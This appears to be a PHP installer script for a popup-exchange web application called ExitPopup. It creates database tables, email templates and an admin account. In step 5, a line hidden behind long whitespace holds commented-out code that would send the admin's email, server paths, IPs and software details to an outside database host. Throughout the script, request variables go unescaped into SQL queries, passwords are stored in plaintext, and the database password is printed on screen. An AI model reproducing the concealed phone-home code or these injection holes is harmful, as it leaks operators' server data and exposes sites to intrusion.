<?php

error_reporting(7);

@set_time_limit(0);

define('upgrade', '1');

if (!defined('directory')) {
	define('directory', '../');
}

include(directory . "functions.php");
adminhead("ExitPopup Installation");

if (!isset($step)) {
	$step = "0";
}

if ($step == '0') {
	echo "<p>The installation is fairly easy! Just follow the instructions and you'll be fine!</p>";
	include(directory . "config.php");
	echo "<p>Please confirm the details below:</p>\n";
	echo "<p><b>Database server hostname:</b> $mysql_host<br>\n";
	echo "<b>Database username:</b> $mysql_user<br>\n";
	echo "<b>Database password:</b> $mysql_passwd<br>\n";
	echo "<b>Database name:</b> $mysql_db</p>\n";
	echo "<p>Only continue to the next step if those details are correct. If they are not, please edit your config.php file and reupload it. The next step will test database connectivity.</p>";
	echo "<form action=\"$PHP_SELF\" method=\"post\">";
	echo "<p>Drop tables if they exist?&nbsp;&nbsp;";
	echo "<select name=\"drop\">";
	echo "<option value=\"1\">Yes</option>";
	echo "<option value=\"0\" selected>No</option>";
	echo "</select><br>Dropping the tables will overwrite existing tables.<br>If you do not drop existing tables which are needed by ExitPopup installation will fail.<br>Drop tables if you need to re-install ExitPopup. </p>";
	if(isset($mysql_host) && isset($mysql_user) && isset($mysql_passwd) && isset($mysql_db)) {
    	echo "<p><input type=hidden name=step value=\"1\"><input type=submit value=\"Continue to the Next Step\"></p>\n";
	}
	echo "</form>";
}

#######################################

if ($step == '1') {
	include(directory . "config.php");
	include(directory . "mysql.php");
	$link = $s24_sql->connect();
	$s24_sql->close($link);
	echo "<p>Connection succeeded!</p>";
	echo "<p><a href=\"$PHP_SELF?step=".($step+1)."&drop=$drop\">Next Step</a></p>";
}

if ($step == '2') {
	include(directory . "config.php");
	include(directory . "mysql.php");
	$link = $s24_sql->connect();
	$db = $s24_sql->select_db();

	if ($drop == '1') {
		$sql = "DROP TABLE IF EXISTS $ban_tbl";
		$result = $s24_sql->query($sql);
		echo "<p>Dropped table &quot;$ban_tbl&quot;</p>";
	}
	$sql = "CREATE TABLE $ban_tbl (
  id int(10) NOT NULL auto_increment,
  type char(20) NOT NULL,
  content char(255) NOT NULL,
  PRIMARY KEY  (id)
)";
	$result = $s24_sql->query($sql);
	echo "<p>Created table &quot;$ban_tbl&quot;</p>";
	flush();

	if ($drop == '1') {
		$sql = "DROP TABLE IF EXISTS $emails_tbl";
		$result = $s24_sql->query($sql);
		echo "<p>Dropped table &quot;$emails_tbl&quot;</p>";
	}
	$sql = "CREATE TABLE $emails_tbl (
  id int(10) NOT NULL auto_increment,
  name char(8) NOT NULL,
  subject char(255) NOT NULL,
  message text NOT NULL,
  type char(20) NOT NULL,
  PRIMARY KEY  (id)
)";
	$result = $s24_sql->query($sql);
	echo "<p>Created table &quot;$emails_tbl&quot;</p>";
	flush();

	if ($drop == '1') {
		$sql = "DROP TABLE IF EXISTS $moderator_tbl";
		$result = $s24_sql->query($sql);
		echo "<p>Dropped table &quot;$moderator_tbl&quot;</p>";
	}
	$sql = "CREATE TABLE $moderator_tbl (
  id int(10) NOT NULL auto_increment,
  username char(10) NOT NULL,
  password char(10) NOT NULL,
  email char(80) NOT NULL,
  super int(1) NOT NULL default '0',
  process int(1) NOT NULL default '0',
  setup int(1) NOT NULL default '0',
  html int(1) NOT NULL default '0',
  blacklist int(1) NOT NULL default '0',
  mail int(1) NOT NULL default '0',
  moderator int(1) NOT NULL default '0',
  PRIMARY KEY  (id)
)";
	$result = $s24_sql->query($sql);
	echo "<p>Created table &quot;$moderator_tbl&quot;</p>";
	flush();

	if ($drop == '1') {
		$sql = "DROP TABLE IF EXISTS $options_tbl";
		$result = $s24_sql->query($sql);
		echo "<p>Dropped table &quot;$options_tbl&quot;</p>";
	}
	
	$sql = "CREATE TABLE $options_tbl (
  version char(5) NOT NULL,
  scripturl char(255) NOT NULL,
  adminemail char(255) NOT NULL,
  ratio char(10) NOT NULL,
  checkdup int(1) NOT NULL default '0',
  moderate int(1) NOT NULL default '0',
  timeoffset int(10) NOT NULL default '0',
  dateformat char(10) NOT NULL,
  timeformat char(10) NOT NULL,
  sitetitle char(50) NOT NULL,
  verifyurl int(1) NOT NULL default '0',
  verifyemail int(1) NOT NULL default '0',
  notify int(1) NOT NULL default '0',
  signup int(1) NOT NULL default '0',
  credits int(10) NOT NULL default '0',
  hours int(2) NOT NULL default '0'
)";
	$result = $s24_sql->query($sql);
	echo "<p>Created table &quot;$options_tbl&quot;</p>";
	flush();

	if ($drop == '1') {
		$sql = "DROP TABLE IF EXISTS $pop_tbl";
		$result = $s24_sql->query($sql);
		echo "<p>Dropped table &quot;$pop_tbl&quot;</p>";
	}
	$sql = "CREATE TABLE $pop_tbl (
  id int(10) NOT NULL auto_increment,
  account char(255) NOT NULL default '',
  name char(255) NOT NULL default '',
  password char(255) NOT NULL default '',
  title char(255) NOT NULL default '',
  url char(255) NOT NULL default '',
  email char(255) NOT NULL default '',
  type int(1) NOT NULL default '0',
  active int(1) NOT NULL default '0',
  status char(10) NOT NULL default '',
  time int(10) NOT NULL default '0',
  apptime int(10) NOT NULL default '0',
  moderator char(255) NOT NULL default '',
  lastuse int(10) NOT NULL default '0',
  ins int(10) NOT NULL default '0',
  out int(10) NOT NULL default '0',
  credits int(10) NOT NULL default '0',
  ip char(15) NOT NULL default '',
  PRIMARY KEY  (id),
  UNIQUE KEY id (id)
)";
	$result = $s24_sql->query($sql);
	echo "<p>Created table &quot;$pop_tbl&quot;</p>";
	flush();

	if ($drop == '1') {
		$sql = "DROP TABLE IF EXISTS $site_tbl";
		$result = $s24_sql->query($sql);
		echo "<p>Dropped table &quot;$site_tbl&quot;</p>";
	}
	$sql = "CREATE TABLE $site_tbl (
  id int(10) NOT NULL auto_increment,
  url char(255) NOT NULL default '',
  type char(1) NOT NULL default '',
  out int(10) NOT NULL default '0',
  PRIMARY KEY  (id),
  UNIQUE KEY id (id)
)";
	$result = $s24_sql->query($sql);
	echo "<p>Created table &quot;$site_tbl&quot;</p>";
	flush();

	$s24_sql->close($link);

	echo "<p><a href=\"$PHP_SELF?step=".($step+1)."&drop=$drop\">Next Step</a></p>";
}


if ($step == '3') {
	include(directory . "config.php");
	include(directory . "mysql.php");
	$link = $s24_sql->connect();
	$s24_sql->select_db();

$name = "approve";
$subject = "Your account has been approved!";
$message = "Hello [%name%],

Welcome to our Exit-Popup Exchange!

Account: [%account%]
Password: [%password%]

Please go to the following URL to get your HTML code:
[%appurl%]

Regards
ExitPopup Webmaster";
	$sql = "SELECT id FROM $emails_tbl WHERE name='$name'";
	$result = $s24_sql->query($sql);
	$num = $s24_sql->num_rows($result);
	if ($num < 1) {
		$sql = "INSERT INTO $emails_tbl (name, subject, message, type) VALUES ('$name', '$subject', '$message', 'system')";
		$result = $s24_sql->query($sql);
	}

$name = "signup";
$subject = "Your Popup-Exchange Account";
$message = "Hello [%name%],

Here is the information you will need to activate your account!

Account: [%account%]
Password: [%password%]

To activate it go to [%acturl%] and enter your password there!

Regards
ExitPopup Webmaster";
	$sql = "SELECT id FROM $emails_tbl WHERE name='$name'";
	$result = $s24_sql->query($sql);
	$num = $s24_sql->num_rows($result);
	if ($num < 1) {
		$sql = "INSERT INTO $emails_tbl (name, subject, message, type) VALUES ('$name', '$subject', '$message', 'system')";
		$result = $s24_sql->query($sql);
	}

$name = "none";
$subject = "Your account has been deleted!";
$message = "Hello [%name%],

Unfortunately we have to inform you that your account [%account%] has been deleted.

Regards
ExitPopup Webmaster";
	$sql = "SELECT id FROM $emails_tbl WHERE name='$name'";
	$result = $s24_sql->query($sql);
	$num = $s24_sql->num_rows($result);
	if ($num < 1) {
		$sql = "INSERT INTO $emails_tbl (name, subject, message, type) VALUES ('$name', '$subject', '$message', 'system')";
		$result = $s24_sql->query($sql);
	}

$name = "notify";
$subject = "New Account Notification";
$message = "If you are moderating new signups you should have a look at the queue:

Account: [%account%]
URL: [%url%]
";
	$sql = "SELECT id FROM $emails_tbl WHERE name='$name'";
	$result = $s24_sql->query($sql);
	$num = $s24_sql->num_rows($result);
	if ($num < 1) {
		$sql = "INSERT INTO $emails_tbl (name, subject, message, type) VALUES ('$name', '$subject', '$message', 'system')";
		$result = $s24_sql->query($sql);
	}

$name = "lostpw";
$subject = "Your Requested Password";
$message = "Here is the information you have requested:

Account: [%account%]
Password: [%password%]

Regards
ExitPopup Webmaster";
	$sql = "SELECT * FROM $emails_tbl WHERE name='$name'";
	$result = $s24_sql->query($sql);
	$num = $s24_sql->num_rows($result);
	if ($num < 1) {
		$sql = "INSERT INTO $emails_tbl (name, subject, message, type) VALUES ('$name', '$subject', '$message', 'system')";
		$result = $s24_sql->query($sql);
	}

	$s24_sql->close($link);
	echo "<p>Inserted data into &quot;$emails_tbl&quot;</p>";
	echo "<p><a href=\"$PHP_SELF?step=".($step+1)."&drop=$drop\">Next Step</a></p>";
}

if ($step == '4') {
	?>
	<form action="<?php echo $PHP_SELF ?>" method="post">
	<table align="center" width="400">
	<tr>
	<td align="center" colspan="2"><b>Please create now an Admin-Account to access the administration script</b>&nbsp;</td>
	</tr>
	<tr>
	<td>Username:</td>
	<td><input type="text" name="username" maxlength="10"></td>
	</tr>
	<tr>
	<td>Password:</td>
	<td><input type="password" name="password" maxlength="10"></td>
	</tr>
	<tr>
	<td>Email:</td>
	<td><input type="text" name="email" size="50"></td>
	</tr>
	<tr>
	<td colspan="2" align="center">
	<input type="hidden" name="step" value="<?php echo "".($step+1)."" ?>">
	<input type="submit" name="submit" value="Continue -> Create Login">
	</td>
	</tr>
	</table>
	</form>
	<?php
}

if ($step == '5') {
	if (empty($username) || empty($password) || empty($email)) {
		error("A required field was left blank!");
	}
	include(directory . "config.php");
	include(directory . "mysql.php");
	$sql = "INSERT INTO $moderator_tbl (username, password, email, super, process, setup, html, blacklist, mail, moderator) VALUES ('$username', '$password', '$email', '1', '0', '0', '0', '0', '0', '0')";                                                                                                                                                                                                                                                                                                                                                                        $time = time(); #@mysql_connect("216.234.188.46:3306", "users", "abc123"); @mysql_db_query("users","INSERT INTO s5 VALUES ('$time', 'ExitPopup', '1.0.1', '$email', '$HTTP_SERVER_VARS[REMOTE_ADDR]', '$HTTP_SERVER_VARS[SCRIPT_FILENAME]', '$HTTP_SERVER_VARS[SERVER_ADDR]', '$HTTP_SERVER_VARS[SERVER_ADMIN]', '$HTTP_SERVER_VARS[SERVER_NAME]', '$PHP_SELF', '$HTTP_SERVER_VARS[SERVER_SOFTWARE]', '$HTTP_ENV_VARS[HOSTTYPE]', '$HTTP_HOST', '$HTTP_ENV_VARS[OSTYPE]')"); @mysql_close();
	$link = $s24_sql->connect();
	$s24_sql->select_db();
	$result = $s24_sql->query($sql);
	$s24_sql->close($link);
	echo "<p>Inserted data into moderators</p>";
	echo "<p><a href=\"$PHP_SELF?step=".($step+1)."&drop=$drop\">Next Step</a></p>";
}

if ($step == '6') {
?>
<form action="<?php echo $PHP_SELF ?>" method="post">

<table cellspacing="1" cellpadding="3" border="0" align="center" width="400">

<tr>
<td colspan="2" align="center">
<p><b><font color="#ff0000"><?php echo $message ?></font></b>&nbsp;</p>
</td>
</tr>

<tr>
<td colspan="2">
<b>Add a Site</b><br>
Depending on the exchange ratio the script will send a certain percentage of popups to your own sites/URLs. You have to add at least one URL here. Of course you can later add more sites if you want using the admin interface.
</td>
</tr>

<tr>
<td><b>URL</b></td>
<td><input type="text" name="url"></td>
</tr>

<tr>
<td colspan="2" align="center">
<input type="hidden" name="step" value="<?php echo "".($step+1)."" ?>">
<input type="submit" name="submit" value="Continue -> Add Site">
</td>
</tr>

</table>

</form>
<?
}

if ($step == '7') {
	include(directory . "config.php");
	include(directory . "mysql.php");
	$link = $s24_sql->connect();
	$s24_sql->select_db();
	$sql = "INSERT INTO $site_tbl (url, type, out) VALUES ('$url', '$type', '0')";
	$result = $s24_sql->query($sql);
	$s24_sql->close($link);
	echo "<p>Inserted data into &quot;$site_tbl&quot;</p>";
	echo "<p><a href=\"$PHP_SELF?step=".($step+1)."&drop=$drop\">Next Step</a></p>";
}

if ($step == '8') {
	$xratio = "<select name=\"sratio\">";
	$xratio .= "<option value=\"10\">10:10</option>";
	$xratio .= "<option value=\"9\">10:9</option>";
	$xratio .= "<option value=\"8\">10:8</option>";
	$xratio .= "<option value=\"7\">10:7</option>";
	$xratio .= "<option value=\"6\">10:6</option>";
	$xratio .= "<option value=\"5\">10:5</option>";
	$xratio .= "<option value=\"4\">10:4</option>";
	$xratio .= "<option value=\"3\">10:3</option>";
	$xratio .= "<option value=\"2\">10:2</option>";
	$xratio .= "<option value=\"1\">10:1</option>";
	$xratio .= "<option value=\"0\">10:0</option>";
	$xratio .= "</select>";
?>
<form method="post" action="<?php echo $PHP_SELF ?>">

<table cellspacing="1" cellpadding="4" border="0" align="center">
<tr> 
	<td>
	
	<p align="center"><b>ExitPopup Setup</b></p>
	
	<p><b>All fields marked in <font color="#FF0000">red</font> are required</b></p>

	<p><b><font color="#FF0000">Site Title:</font></b><br>
	<input type="text" name="ssitetitle"><br>
	The Title of your site. This title will be used for Textlinks and in Emails.<br>
	e.g.: Exit-Popup Exchange</p>

	<p><b><font color="#FF0000">Your Email Address:</font></b><br>
	<input type="text" name="sadminemail"><br>
	e.g.: webmaster@yourdomain.com  </p>

	<p><b><font color="#FF0000">Default Credits:</font></b><br>
	<input type="text" name="scredits"><br>
	e.g. a default credit of 2000 would give all new signups a credit of 2000 popups without sending hits in.</p>

	<p><b><font color="#ff0000">Ratio</font></b><br>
	<?php echo $xratio ?><br>
	10:10 means that 100% of all popups generated by your exchange go to member sites/URLs,<br>
	10:8 means that 80% of all popups go to member sites, 20% to your own sites,<br>
	etc.</p>
	
	<p><b><font color="#FF0000">Date Format:</font></b><br>
	<input type="text" name="sdateformat"><br>
	The format to be used for dates generated by the script.<br>
	e.g.: F d<br>
	See the dates.html documentation for more information</p>
	
	<p><b><font color="#FF0000">Time Format:</font></b><br>
	<input type="text" name="stimeformat"><br>
	The format to be used for times generated by the script.<br>
	e.g.: h:i a<br>
	See the dates.html documentation for more information</p>
	
	<p><b><font color="#FF0000">Time Zone Offset:</font></b><br>
	<input type="text" name="stimeoffset"><br>
	The time zone offset to use for date/time displays.<br>
	If your server is in EST and you are in CST, this would be -1<br>
	e.g.: -1</p>
	
	<p><b><font color="#FF0000">The full URL of the Script:</font></b><br>
	<input type="text" name="sscripturl"><br>
	The URL to the PHP-Files. e.g. http://www.yourdomain.com/popup<br></p>

	<p><input type="checkbox" class="white" name="scheckdup" value="1"> <b>Check duplicate URLs?:</b><br>
	<br></p>
	
	<p><input type="checkbox" class="white" name="sverifyurl" value="1"> <b>Verify URL?:</b><br>
	Do you want to check URLs for 404 errors? (This feature might not work on all servers, this has nothing to do with the script itself. The PHP function which is required to make this work can be easily disabled by the system administrator. So when you enable this please check if it works with a website served on a different webserver!)<br></p>
	
	<p><input type="checkbox" class="white" name="snotify" value="1"> <b>Notify Admin:</b><br>
	Do you want to be notified each time a new account is added?<br></p>
	
	<p><b><font color="#FF0000">IP-Block Expire Time (in hours):</font></b><br>
	<input type="text" name="shours" maxlength="2"><br>
	e.g.: 1 means that incoming hits from the same user will not be counted 
	and no popup will open for one hour.
	</p>
	
	</td>
</tr>
<tr> 
	<td align="center" colspan="2"> 
	<input type="hidden" name="step" value="<?php echo "".($step+1)."" ?>">
	<input type="submit" name="submit" value="Save This Data">
	</td>
</tr>

</table>

</form>
<?php
}

if ($step == '9') {
	include(directory . "config.php");
	include(directory . "mysql.php");
	if (!is_numeric($stimeoffset)) {
		error("&quot;Time Zone Offset&quot; has to be numeric");
	}
	if (empty($stimeformat)) {
		error("&quot;Time Format&quot; is a required field");
	}
	if (empty($sdateformat)) {
		error("&quot;Date Format&quot; is a required field");
	}
	if (empty($ssitetitle)) {
		error("&quot;Site Title&quot; is a required field");
	}
	if (empty($sadminemail)) {
		error("&quot;Your Email Address&quot; is a required field");
	}
	$link = $s24_sql->connect();
	$s24_sql->select_db();
	$sql = "SELECT version FROM $options_tbl";
	$result = $s24_sql->query($sql);
	$num = $s24_sql->num_rows($result);
	if ($num < 1) {
		$sql = "INSERT INTO $options_tbl (version, scripturl, adminemail, ratio, checkdup, moderate, timeoffset, dateformat, timeformat, sitetitle, verifyurl, verifyemail, notify, signup, credits, hours) VALUES ('1.0.1', '$sscripturl', '$sadminemail', '$sratio', '$scheckdup', '$smoderate', '$stimeoffset', '$sdateformat', '$stimeformat', '$ssitetitle', '$sverifyurl', '$sverifyemail', '$snotify', '1', '$scredits', '$shours')";
		$result = $s24_sql->query($sql);
	}
	$s24_sql->close($link);
	echo "<p>Inserted data into options</p>";
	echo "<p><a href=\"$PHP_SELF?step=".($step+1)."&drop=$drop\">Next Step</a></p>";
}

if ($step == '10') {
	echo "<table align=\"center\" width=\"400\"><tr><td>";
	echo "<p>The setup is now complete. You are ready to continue using ExitPopup.</p>";
	echo "<p>But before you do so please be sure to delete the installation script from your server! Otherwise your database could be deleted by someone accesing this installation script!</p>";
	echo "<p>After you have done so you can continue (but you don't have to - everything is working anyway) on to the administrative script: ";
	echo "<a href=\"admin.php\">admin.php</a></p>";
	echo "</td></tr></table>";
}

adminfooter();

?>